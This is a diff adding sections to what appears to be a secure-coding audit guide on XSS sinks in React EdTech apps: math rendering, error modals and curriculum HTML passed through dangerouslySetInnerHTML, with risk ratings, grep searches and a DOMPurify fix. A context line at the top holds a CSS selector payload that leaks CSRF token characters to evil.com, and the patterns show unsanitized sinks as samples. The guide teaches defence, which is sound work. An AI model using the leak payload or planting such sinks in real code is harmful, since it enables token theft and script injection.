@@ -206,3 +206,78 @@ input[name="csrf"][value^="b"] { background: url("https://evil.com/leak?char=b")
 const ALLOWED_COLORS = ["red", "blue", "green", "black"];
 const safeColor = ALLOWED_COLORS.includes(userColor) ? userColor : "black";
 ```
+
+## Real-World EdTech Patterns (from production audits)
+
+### Pattern 10: Math/LaTeX Renderer with dangerouslySetInnerHTML
+
+EdTech apps frequently render mathematical content using KaTeX or MathJax, which outputs HTML. This is a legitimate use of `dangerouslySetInnerHTML` — but it must be verified that the renderer itself sanitizes output.
+
+```tsx
+// COMMON IN EDTECH: Math rendering
+import katex from "katex";
+
+function MathRenderer({ latex }: { latex: string }) {
+  const rendered = katex.renderToString(latex, { throwOnError: false });
+  return <span dangerouslySetInnerHTML={{ __html: rendered }} />;
+}
+
+// RISK ASSESSMENT:
+// - KaTeX's renderToString DOES sanitize output (safe by design)
+// - But verify: is `latex` input coming from a trusted source (teacher/system) or untrusted (student)?
+// - If student-controlled: KaTeX itself is safe, but the input could be crafted to produce
+//   misleading content (not XSS, but integrity concern)
+
+// VERIFY: Check KaTeX version — older versions had XSS issues
+// npm info katex version → ensure >= 0.16.x
+```
+
+**Search pattern:**
+```bash
+grep -rn "katex\|mathjax\|renderToString\|MathRenderer\|latex" --include="*.tsx" --include="*.ts" src/ | grep -i "dangerously\|innerHTML"
+```
+
+### Pattern 11: Error/System Modal with dangerouslySetInnerHTML
+
+Apps often render system messages (rate limits, maintenance notices) with `dangerouslySetInnerHTML` for rich formatting. These seem safe because the content is "system-generated" — but verify the source.
+
+```tsx
+// COMMON: Error modal with HTML content
+function RateLimitModal({ message }: { message: string }) {
+  return (
+    <div className="modal">
+      <div dangerouslySetInnerHTML={{ __html: message }} />
+    </div>
+  );
+}
+
+// RISK ASSESSMENT:
+// - If `message` comes from a hardcoded string or i18n key → LOW risk
+// - If `message` comes from an API response → MEDIUM risk (backend could be compromised)
+// - If `message` comes from URL params or user input → CRITICAL
+
+// VERIFY: Trace the data source
+// grep -rn "RateLimitModal\|rateLimitMessage\|errorHtml" src/ to find callers
+```
+
+### Pattern 12: Curriculum/Learning Outcome Content with HTML
+
+EdTech apps often render curriculum standards or learning outcomes that come from official databases and contain HTML formatting.
+
+```tsx
+// COMMON: Curriculum content with HTML formatting
+function LearningOutcomeSelector({ outcomes }) {
+  return outcomes.map(outcome => (
+    <div key={outcome.id} dangerouslySetInnerHTML={{ __html: outcome.description }} />
+  ));
+}
+
+// RISK ASSESSMENT:
+// - If outcomes come from your own curated database → LOW risk (trust the source)
+// - If outcomes come from an external curriculum API → MEDIUM risk
+// - If teachers can create/edit outcomes → HIGH risk (teacher XSS → student impact)
+
+// SAFER: Sanitize regardless of source (defense in depth)
+import DOMPurify from "dompurify";
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(outcome.description) }} />
+```
